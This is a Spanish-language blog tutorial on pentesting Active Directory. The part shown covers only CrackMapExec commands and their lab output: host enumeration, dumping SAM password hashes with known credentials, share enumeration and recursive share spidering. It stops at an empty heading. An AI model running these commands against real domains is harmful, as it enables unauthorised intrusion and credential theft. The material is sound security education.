---
title: Pentesting Active Directory
date: 2023-09-01 9:00:00
categories: [Active Directory, Windows, Apuntes]
tags: [ad, active directory, windows, windows server, tutorial]    
author: Waidroc
---


![Disclaimer!](/assets/img/2023-09-01/ad_titulo.jpg)


Esta vez, vamos a explorar diversas estrategias, enfoques y metodologías más comunes y efectivas para llevar a cabo pruebas de penetración en entornos de Active Directory. ¡Comencemos!

<h2> ¿Qué es Active Directory? </h2>

Active Directory (AD) es un servicio de directorio desarrollado por Microsoft que actúa como un sistema centralizado para `administrar y organizar recursos` en una red. Funciona como una base de datos `jerárquica` que almacena información sobre usuarios, grupos, dispositivos y recursos en una red, permitiendo un acceso y una administración eficiente de los recursos.

Su importancia a nivel empresarial radica en que proporciona una `estructura organizativa` para la gestión de usuarios y recursos de TI. Permite a las organizaciones establecer políticas de seguridad, asignar permisos y derechos de acceso, y gestionar de manera centralizada la autenticación y autorización en toda la red. Además, facilita la administración de sistemas, la implementación de políticas de grupo y la gestión de software a través de la red, lo que ahorra tiempo y recursos en entornos empresariales de cualquier tamaño.

<h2> ¿Qué vamos a ver en este post?</h2>

⧫ Crackmapexec enumeration
⧫ SMB Relay
⧫ Pass The Hash
⧫ Grabbing info from users
⧫ LDAP Enumeration
⧫ Kerbrute
⧫ Kerberoasting
⧫ AS-REP Roast
⧫ Golden Ticket
⧫ Rubeus - Kerberoasting
⧫ Rubeus - AS-REP Roast
⧫ SCF Files
⧫ Bloodhound & neo4j

# CrackMapExec enumeration

- - -

![Disclaimer!](/assets/img/2023-09-01/cme.png)

Esta es la herramienta más utilizada para el pentesting en Active Directory, ya que `enumera` los servicios más comunes. A pesar de esto, es bastante sencilla de usar. Veamos que podemos realizar con esta `navaja suiza`:

## SMB Enumeration

- - -

`SMB` es un protocolo utilizado por sistemas Windows para compartir archivos e impresoras, así como para otras funciones. Es una parte esencial de muchas redes y uno de los servicios más comunes que se ejecutan. Existen varias herramientas para enumerar SMB, como `smbclient` o `smbmap`. Pero crackmapexec es mi favorita por muchas razones. Hablemos de ellas:

### Network information

- - -

Utilizar `crackmapexec` de la manera más sencilla puede proporcionarte información como el dominio del Controlador de Dominio (DC), la firma SMB (la cual comprobaremos en el SMB Relay) o el nombre del host.

```zsh
❯ cme smb 192.168.10.1/24
SMB         192.168.10.110   445    W1-PC        [*] Windows 10.0 Build 19041 x64 (name:W1-PC) (domain:waidroc.local) (signing:False) (SMBv1:False)
SMB         192.168.10.115   445    W2-PC  [*] Windows 10.0 Build 17763 x64 (name:W2-PC) (domain:waidroc.local) (signing:True) (SMBv1:False)
SMB         192.168.10.120   445    W3-PC        [*] Windows 10.0 Build 19041 x64 (name:W3-PC) (domain:waidroc.local) (signing:False) (SMBv1:False)
```

De esta forma, podríamos ver los hosts con Windows que están conectados a la red. Podemos ver que el Controlador de Dominio (192.168.10.115) tiene la firma SMB, pero eso no importa si los otros PCs conectados al Controlador de Dominio no tienen la misma firma.

### Dumping SAM

- - -

Si sabemos las credenciales de uno de los usuarios del sistema, podemos dumpear el fichero `SAM`, el cual contiene las contraseñas en forma de hash (NTLM) de las cuentas de usuario locales.

```zsh
❯ cme smb 192.168.10.1/24 -u usuario -p 'Password2' --sam
SMB         192.168.10.115   445    W2-PC  [*] Windows 10.0 Build 17763 x64 (name:W2-PC) (domain:waidroc.local) (signing:True) (SMBv1:False)
SMB         192.168.10.110   445    W1-PC        [*] Windows 10.0 Build 19041 x64 (name:W1-PC) (domain:waidroc.local) (signing:False) (SMBv1:False)
SMB         192.168.10.115   445    W2-PC  [+] waidroc.local\usuario:Password2 
SMB         192.168.10.110   445    W1-PC        [+] waidroc.local\usuario:Password2 
SMB         192.168.10.120   445    W3-PC        [*] Windows 10.0 Build 19041 x64 (name:W3-PC) (domain:waidroc.local) (signing:False) (SMBv1:False)
SMB         192.168.10.120   445    W3-PC        [+] waidroc.local\usuario:Password2 (Pwn3d!)
SMB         192.168.10.120   445    W3-PC        [+] Dumping SAM hashes
SMB         192.168.10.120   445    W3-PC        Administrador:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         192.168.10.120   445    W3-PC        Invitado:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         192.168.10.120   445    W3-PC        DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         192.168.10.120   445    W3-PC        WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:7b75aeef3ea91facb4cd29e7da7832d9:::
SMB         192.168.10.120   445    W3-PC        Cordy:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
SMB         192.168.10.120   445    W3-PC        [+] Added 5 SAM hashes to the database
```
Aquí podemos observar que al saber la contraseña de `usuario`, podemos ver y dumpear el fichero SAM del host W3-PC, obteniendo los hashes de sus cuentas de usuario local. Ahora, si esas contraseñas son "flojas" y pueden obtenerse fácilmente con un ataque de fuerza bruta o de diccionario, nos podríamos hacer con el control total del sistema.

### Share enumeration

- - -

```zsh
❯ cme smb 192.168.10.1/24 -u cordy -p 'Password1' --shares
SMB         192.168.10.115   445    W2-PC  [*] Windows 10.0 Build 17763 x64 (name:W2-PC) (domain:waidroc.local) (signing:True) (SMBv1:False)
SMB         192.168.10.110   445    W1-PC        [*] Windows 10.0 Build 19041 x64 (name:W1-PC) (domain:waidroc.local) (signing:False) (SMBv1:False)
SMB         192.168.10.115   445    W2-PC  [+] waidroc.local\cordy:Password1 
SMB         192.168.10.110   445    W1-PC        [+] waidroc.local\cordy:Password1 
SMB         192.168.10.110   445    W1-PC        [+] Enumerated shares
SMB         192.168.10.110   445    W1-PC        Share           Permissions     Remark
SMB         192.168.10.110   445    W1-PC        -----           -----------     ------
SMB         192.168.10.110   445    W1-PC        ADMIN$                          Admin remota
SMB         192.168.10.110   445    W1-PC        C$                              Recurso predeterminado
SMB         192.168.10.110   445    W1-PC        IPC$            READ            IPC remota
SMB         192.168.10.120   445    W3-PC        [*] Windows 10.0 Build 19041 x64 (name:W3-PC) (domain:waidroc.local) (signing:False) (SMBv1:False)
SMB         192.168.10.115   445    W2-PC  [+] Enumerated shares
SMB         192.168.10.120   445    W3-PC        [+] waidroc.local\cordy:Password1 
SMB         192.168.10.115   445    W2-PC  Share           Permissions     Remark
SMB         192.168.10.115   445    W2-PC  -----           -----------     ------
SMB         192.168.10.115   445    W2-PC  ADMIN$                          Remote Admin
SMB         192.168.10.115   445    W2-PC  C$                              Default share
SMB         192.168.10.115   445    W2-PC  IPC$            READ            Remote IPC
SMB         192.168.10.115   445    W2-PC  NETLOGON        READ            Logon server share 
SMB         192.168.10.115   445    W2-PC  SYSVOL          READ            Logon server share 
SMB         192.168.10.120   445    W3-PC        [+] Enumerated shares
SMB         192.168.10.120   445    W3-PC        Share           Permissions     Remark
SMB         192.168.10.120   445    W3-PC        -----           -----------     ------
SMB         192.168.10.120   445    W3-PC        ADMIN$                          Admin remota
SMB         192.168.10.120   445    W3-PC        C$                              Recurso predeterminado
SMB         192.168.10.120   445    W3-PC        IPC$            READ            IPC remota
                                                                                                                                                                                                                                
❯ cme smb 192.168.0.1/24 -u usuario -p 'Password2' --shares
SMB         192.168.10.115   445    W2-PC  [*] Windows 10.0 Build 17763 x64 (name:W2-PC) (domain:waidroc.local) (signing:True) (SMBv1:False)
SMB         192.168.10.110   445    W1-PC        [*] Windows 10.0 Build 19041 x64 (name:W1-PC) (domain:waidroc.local) (signing:False) (SMBv1:False)
SMB         192.168.10.115   445    W2-PC  [+] waidroc.local\usuario:Password2 
SMB         192.168.10.110   445    W1-PC        [+] waidroc.local\usuario:Password2 
SMB         192.168.10.110   445    W1-PC        [+] Enumerated shares
SMB         192.168.10.110   445    W1-PC        Share           Permissions     Remark
SMB         192.168.10.110   445    W1-PC        -----           -----------     ------
SMB         192.168.10.110   445    W1-PC        ADMIN$                          Admin remota
SMB         192.168.10.110   445    W1-PC        C$                              Recurso predeterminado
SMB         192.168.10.110   445    W1-PC        IPC$            READ            IPC remota
SMB         192.168.10.120   445    W3-PC        [*] Windows 10.0 Build 19041 x64 (name:W3-PC) (domain:waidroc.local) (signing:False) (SMBv1:False)
SMB         192.168.10.115   445    W2-PC  [+] Enumerated shares
SMB         192.168.10.115   445    W2-PC  Share           Permissions     Remark
SMB         192.168.10.115   445    W2-PC  -----           -----------     ------
SMB         192.168.10.115   445    W2-PC  ADMIN$                          Remote Admin
SMB         192.168.10.115   445    W2-PC  C$                              Default share
SMB         192.168.10.115   445    W2-PC  IPC$            READ            Remote IPC
SMB         192.168.10.115   445    W2-PC  NETLOGON        READ            Logon server share 
SMB         192.168.10.115   445    W2-PC  SYSVOL          READ            Logon server share 
SMB         192.168.10.120   445    W3-PC        [+] waidroc.local\usuario:Password2 (Pwn3d!)
SMB         192.168.10.120   445    W3-PC        [+] Enumerated shares
SMB         192.168.10.120   445    W3-PC        Share           Permissions     Remark
SMB         192.168.10.120   445    W3-PC        -----           -----------     ------
SMB         192.168.10.120   445    W3-PC        ADMIN$          READ,WRITE      Admin remota
SMB         192.168.10.120   445    W3-PC        C$              READ,WRITE      Recurso predeterminado
SMB         192.168.10.120   445    W3-PC        IPC$            READ            IPC remota
```

De nuevo, podemos observar de nuevo que el usuario `usuario` tiene permisos de administrador sobre el usuario `cordy`. Esta salida nos muestra el tipo de permisos sobre los recursos compartidos (si los hay).

### Spidering

- - -

Una de las opciones más importantes que nos brinda `cme` es un módulo llamado `spider_plus`, ya que explora todos los recursos compartidos y directorios que hay en su interior de manera recursiva, proporcionándonos así un resultado ordenado y muy visual, mostrándonos todos los ficheros visibles en cada recurso compartido. 

Este módulo nos agiliza y facilita la tarea, ya que no tenemos que acceder a cada uno de los recursos compartidos para enumerar todos los directoriso y ficheros que contienen manualmente. Veamos un ejemplo:

```zsh
❯ cme smb 192.168.0.1/24 -u usuario -p 'Password2' -M spider_plus
SMB         192.168.10.110   445    W1-PC        [*] Windows 10.0 Build 19041 x64 (name:W1-PC) (domain:waidroc.local) (signing:False) (SMBv1:False)
SMB         192.168.10.120   445    W3-PC        [*] Windows 10.0 Build 19041 x64 (name:W3-PC) (domain:waidroc.local) (signing:False) (SMBv1:False)
SMB         192.168.10.115   445    W2-PC  [*] Windows 10.0 Build 17763 x64 (name:W2-PC) (domain:waidroc.local) (signing:True) (SMBv1:False)
SMB         192.168.10.110   445    W1-PC        [+] waidroc.local\usuario:Password2 
SPIDER_P... 192.168.10.110   445    W1-PC        [*] Started spidering plus with option:
SPIDER_P... 192.168.10.110   445    W1-PC        [*]        DIR: ['print$']
SPIDER_P... 192.168.10.110   445    W1-PC        [*]        EXT: ['ico', 'lnk']
SPIDER_P... 192.168.10.110   445    W1-PC        [*]       SIZE: 51200
SPIDER_P... 192.168.10.110   445    W1-PC        [*]     OUTPUT: /tmp/cme_spider_plus
SMB         192.168.10.120   445    W3-PC        [+] waidroc.local\usuario:Password2 (Pwn3d!)
SPIDER_P... 192.168.10.120   445    W3-PC        [*] Started spidering plus with option:
SPIDER_P... 192.168.10.120   445    W3-PC        [*]        DIR: ['print$']
SPIDER_P... 192.168.10.120   445    W3-PC        [*]        EXT: ['ico', 'lnk']
SPIDER_P... 192.168.10.120   445    W3-PC        [*]       SIZE: 51200
SPIDER_P... 192.168.10.120   445    W3-PC        [*]     OUTPUT: /tmp/cme_spider_plus
SMB         192.168.10.115   445    W2-PC  [+] waidroc.local\usuario:Password2 
SPIDER_P... 192.168.10.115   445    W2-PC  [*] Started spidering plus with option:
SPIDER_P... 192.168.10.115   445    W2-PC  [*]        DIR: ['print$']
SPIDER_P... 192.168.10.115   445    W2-PC  [*]        EXT: ['ico', 'lnk']
SPIDER_P... 192.168.10.115   445    W2-PC  [*]       SIZE: 51200
SPIDER_P... 192.168.10.115   445    W2-PC  [*]     OUTPUT: /tmp/cme_spider_plus
```

### Authentication sprying

- - -
